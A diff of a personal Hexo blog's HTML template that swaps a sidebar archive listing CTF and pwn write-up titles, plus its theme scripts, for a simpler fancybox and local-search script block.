-            <a class="archive-post-title" href="/2024/08/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">羊城杯2023部分题目复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/22</span>
-            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/08</span>
-            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/15</span>
-            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/25</span>
-            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/19</span>
-            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span>
-            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/23</span>
-            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/27</span>
-            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span>
-            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span>
-            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/25</span>
-            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/31</span>
-            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/26</span>
-            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/24</span>
-            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/19</span>
-            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span>
-            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/04</span>
-            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
-        </li>
-    
-    </div>
-</div>
-
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
-        
-            <span class="sidebar-tag-name" data-tags="ctf writeup">
-                <span class="iconfont-archer">&#xe606;</span>
-                ctf writeup
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="misc">
-                <span class="iconfont-archer">&#xe606;</span>
-                misc
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="os">
-                <span class="iconfont-archer">&#xe606;</span>
-                os
-            </span>
-        
-    </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
-    </div> 
-    <div class="sidebar-tags-list"></div>
-</div>
-
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
-    
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
-</div>
-
-    </div>
-</div>
-
-        <!-- site-meta -->
-        <script>
-    var siteMetaRoot = "/"
-    if (siteMetaRoot === "undefined") {
-        siteMetaRoot = '/'
-    }
-    var siteMeta = {
-        url: "https://nyyyddddn.github.io",
-        root: siteMetaRoot,
-        author: "nyyyddddn"
-    }
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
 
-        <!-- import experimental options here -->
-        <!-- Custom Font -->
 
 
-        <!-- main func -->
-        <script src="/scripts/main.js?v=20211217"></script>
-        <!-- dark mode -->
-        <script src="/scripts/dark.js?v=20211217"></script>
-        <!-- fancybox -->
-        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
-        <!-- algolia -->
-        
-        <!-- busuanzi -->
-        
-            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-        
-        <!-- CNZZ -->
-        
-        <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
-        
-        <!-- mermaid -->
-        
-    </body>
-</html>
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
